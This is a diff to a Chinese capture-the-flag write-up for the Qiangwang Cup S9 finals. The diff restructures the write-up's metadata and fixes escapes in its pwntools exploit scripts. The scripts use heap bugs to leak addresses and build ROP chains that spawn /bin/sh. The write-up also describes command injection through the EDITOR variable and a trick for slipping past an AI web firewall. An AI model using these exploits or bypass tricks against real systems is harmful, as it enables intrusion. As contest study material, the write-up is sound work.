@@ -20,7 +20,14 @@ tags:
 - gnome-calculator
 - x86_64
 - sqlite_create_function
-attack_chain: 静态分析SQLite3扩展函数:edit(1,1)+edit(2,1)=vuln函数 → 写temp%llx文件 + sprintf(env_1, filename) → system("%s "%s"", env_1, filename) → 设置EDITOR=gnome-calculator;. 触发edit(任意输入)→ 弹计算器 → 绕过AWDU AI WAF → 弹shell
+attack_chain:
+- '静态分析SQLite3扩展函数:edit(1,1)+edit(2,1)=vuln函数'
+- '写temp%llx文件 + sprintf(env_1, filename)'
+- 'system("%s "%s"", env_1, filename)'
+- '设置EDITOR=gnome-calculator;. 触发edit(任意输入)'
+- '弹计算器'
+- '绕过AWDU AI WAF'
+- '弹shell'
 key_payload: EDITOR环境变量+system命令注入+gnome-calculator弹计算器
 one_liner: 强网杯S9线下赛 RealWorld TrustSQL:SQLite3扩展函数+EDITOR环境变量+system命令注入+弹计算器。
 lesson: SQLite3自定义函数漏洞:edit(1)+edit(2)注册为vuln → 写文件到temp%llx → sprintf(env_1=EDITOR, filename) → system("EDITOR "filename"") → EDITOR=gnome-calculator;. → 任意命令执行;绕过AWDU AI WAF常见:执行特定字符串被识别,可拼接无害命令如ls/cat绕过。
@@ -62,6 +69,9 @@ prerequisites:
 - Unix EDITOR 环境变量与 system() 行为
 - 静态分析（sub_xxx 反汇编）
 - AWDU WAF 绕过思路（拼接无害命令）
+contest_normalized: "强网杯"
+contest_year: 2025
+subcategory_guess: "rce"
 ---
 # 强网杯S9 线下赛 RealWorld TrustSQL & AWDU Pwn 题解
 
@@ -118,11 +128,11 @@ pwndbg> b *$rebase(0x212A0)Breakpoint 2 at 0x5555555752a0pwndbg> cContinuing.Par
 0x55555557546d mov rdi, rax RDI =>0x555555701318◂—'gnome-calculator; "temp35635e99d5c0466c"'►0x555555575470 call system@plt <system@plt> command:
 0x555555701318◂—'gnome-calculator; "temp35635e99d5c0466c"'
 rt(">>> ")sl("ADD")sl(". sh")it()
-defcd(choose): rt("option >n") sl(str(choose))defadd(idx,size,content): cd(0) rt("enter index:n") sl(str(idx)) rt("enter read len:n") sl(str(size)) rt("content:n") s(content)defswap(idx1,idx2): cd(4) rt("enter index:n") sl(str(idx1)) rt("other indexn") sl(str(idx2))deffree(idx): cd(1) rt("enter index:n") sl(str(idx))defshow(idx): cd(2) rt("enter index:n") sl(str(idx))defedit(idx,content): cd(3) rt("enter index:n") sl(str(idx)) rt("content:n") s(content)defdebug(): gdb.attach(p) pause()defexp(): n =0x8000000000000000 add(0,0x100+n,b'') # pause() # dbg(0x03BF4) show(0) rt(b' '*8) pie = ru(6) -0x1220 pr(pie) puts_got = elf.got['puts'] + pie addr = pie +0x10040 # dbg(0x03C23) edit add(1,0x20,b'a') add(2,0x20,b'a') # add(3,0xf0,b'a') add(3,0x20000,b'a') # dbg(0x03C23) edit(2,p64(0) + flat(0x1000,addr)*100) #pr(11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111) # it() # pause() sleep(0.5) pay = flat(addr+0x100,addr+0x118,addr+0x130) pay = pay.ljust(0x100,b'a') pay += flat(0x8,puts_got,pie+0x1220,0x1000,addr) # dbg(0x03C23) edit(1,pay) # debug() # dbg(0x003BF4) # show show(0) rt("content:n") libc.address = ru(6) - libc.sym["puts"] pr(libc.address) sleep(1) if(libc.address >>44) !=0x7: raiseException("Bad libc leak") #pause() environ = libc.sym["environ"] pr(environ) pay = flat(addr+0x100,addr+0x118,addr+0x130) pay = pay.ljust(0x100,b'a') pay += flat(0x8,environ,pie+0x1220,0x1000,addr) edit(1,pay) show(0) rt("content:n") stack = ru(6) -0x130 pr(stack) # dbg(0x03BF4) show pay = flat(addr+0x100,addr+0x118,addr+0x130) pay = pay.ljust(0x100,b'a') pay += flat(0x100,stack) pay +=b'/bin/sh ' edit(1,pay) # dbg(0x03C23,0x0DA55) rdi = libc.address +0x0000000000102dea rax = libc.address +0x00000000000d4f97 rsi = libc.address +0x0000000000053887 syscall = libc.address +0x00000000000255dd edit(0,flat(rax,59,rdi,addr+0x110,rsi,0,syscall)) cd(5)
+defcd(choose): rt("option >n") sl(str(choose))defadd(idx,size,content): cd(0) rt("enter index:n") sl(str(idx)) rt("enter read len:n") sl(str(size)) rt("content:n") s(content)defswap(idx1,idx2): cd(4) rt("enter index:n") sl(str(idx1)) rt("other indexn") sl(str(idx2))deffree(idx): cd(1) rt("enter index:n") sl(str(idx))defshow(idx): cd(2) rt("enter index:n") sl(str(idx))defedit(idx,content): cd(3) rt("enter index:n") sl(str(idx)) rt("content:n") s(content)defdebug(): gdb.attach(p) pause()defexp(): n =0x8000000000000000 add(0,0x100+n,b'') # pause() # dbg(0x03BF4) show(0) rt(b'\\x00'*8) pie = ru(6) -0x1220 pr(pie) puts_got = elf.got['puts'] + pie addr = pie +0x10040 # dbg(0x03C23) edit add(1,0x20,b'a') add(2,0x20,b'a') # add(3,0xf0,b'a') add(3,0x20000,b'a') # dbg(0x03C23) edit(2,p64(0) + flat(0x1000,addr)*100) #pr(11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111) # it() # pause() sleep(0.5) pay = flat(addr+0x100,addr+0x118,addr+0x130) pay = pay.ljust(0x100,b'a') pay += flat(0x8,puts_got,pie+0x1220,0x1000,addr) # dbg(0x03C23) edit(1,pay) # debug() # dbg(0x003BF4) # show show(0) rt("content:n") libc.address = ru(6) - libc.sym["puts"] pr(libc.address) sleep(1) if(libc.address >>44) !=0x7: raiseException("Bad libc leak") #pause() environ = libc.sym["environ"] pr(environ) pay = flat(addr+0x100,addr+0x118,addr+0x130) pay = pay.ljust(0x100,b'a') pay += flat(0x8,environ,pie+0x1220,0x1000,addr) edit(1,pay) show(0) rt("content:n") stack = ru(6) -0x130 pr(stack) # dbg(0x03BF4) show pay = flat(addr+0x100,addr+0x118,addr+0x130) pay = pay.ljust(0x100,b'a') pay += flat(0x100,stack) pay +=b'/bin/sh\\x00' edit(1,pay) # dbg(0x03C23,0x0DA55) rdi = libc.address +0x0000000000102dea rax = libc.address +0x00000000000d4f97 rsi = libc.address +0x0000000000053887 syscall = libc.address +0x00000000000255dd edit(0,flat(rax,59,rdi,addr+0x110,rsi,0,syscall)) cd(5)
 #!/usr/bin/python3frompwnimport*importoscontext(log_level="debug",os="linux",arch="amd64")pr =lambdax: success('x1b[01;38;5;214m'+ hex(x) +'x1b[0m')sl =lambdax: p.sendline(x)s =lambdax: p.send(x)rt =lambdax: p.recvuntil(x)ru =lambdax: u64(p.recv(x).ljust(8,b'x00'))ri =lambdax: int(p.recv(x),16)it =lambda: p.interactive()file_name ='./string_menu'p = process(file_name)#p= remote(")elf = ELF(file_name)
 # libc = elf.libcpie =0defdbg(* addrs): pay ='' ifpie: foriinaddrs: pay +='b *$rebase( '+ str(i) +')'+'n' else: foriinaddrs: pay +='b *'+ str(i) +'n' gdb.attach(p,pay) defcd(choose): rt("Choice: ") sl(str(choose))defadd(content ='a'): cd(1) rt("Enter string content: ") sl(content)defedit(idx,content): cd(2) rt("Enter string index: ") sl(str(idx)) rt("chars):") sl(content)deffree(idx): cd(3) rt("Enter string index: ") sl(str(idx)) defshow(idx): cd(5) rt("index to view: ") sl(str(idx))defdebug(): gdb.attach(p) pause()
 # debug()add(b'ac'*0x10)add(b'b'*0x100)add(b'c'*0x20)add(b'd'*0x20)edit(171,flat(0x100d018))show(0)rt("Content: ")stack = ru(6) -0x2460+0x320pr(stack)
-# add(b'm'*8)edit(171,flat(stack,0x100))rdi =0x00000000010033d6rsi =0x00000000010033d4mov_rax_rsi =0x0000000001009d97syscall =0x00000000010029a8gadget =0x0000000001009dd9pay = flat(rsi,59,0,0,mov_rax_rsi,rdi,stack+0x68,0,rsi,0,0,0,gadget)pay +=b'/bin/sh 'edit(0,pay)cd(8)it()
+# add(b'm'*8)edit(171,flat(stack,0x100))rdi =0x00000000010033d6rsi =0x00000000010033d4mov_rax_rsi =0x0000000001009d97syscall =0x00000000010029a8gadget =0x0000000001009dd9pay = flat(rsi,59,0,0,mov_rax_rsi,rdi,stack+0x68,0,rsi,0,0,0,gadget)pay +=b'/bin/sh\\x00'edit(0,pay)cd(8)it()
 ```
 
 
